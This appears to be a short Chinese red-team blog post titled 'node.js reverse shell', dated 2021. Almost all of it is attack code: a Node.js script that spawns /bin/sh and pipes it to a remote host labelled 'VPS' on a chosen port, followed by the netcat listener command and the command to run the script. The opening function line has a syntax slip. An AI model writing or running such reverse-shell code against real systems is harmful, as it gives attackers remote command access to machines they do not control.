node.js反弹shell

2021-01-15 红队

当环境中有node时，创建shell.js如下：
**注：**如果没有node.js可以直接安装一下：apt-get install node / yum install node

(function()){
    var net = require("net"),
    cp = require("child_process"),
    sh = cp.spawn("/bin/sh",[]);
    var client = new net.Socket();
    client.connect(端口,"VPS",function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);    
    });
    return /a/;
})();

VPS监听：

nc -lvvp 端口

运行：

node shell.js
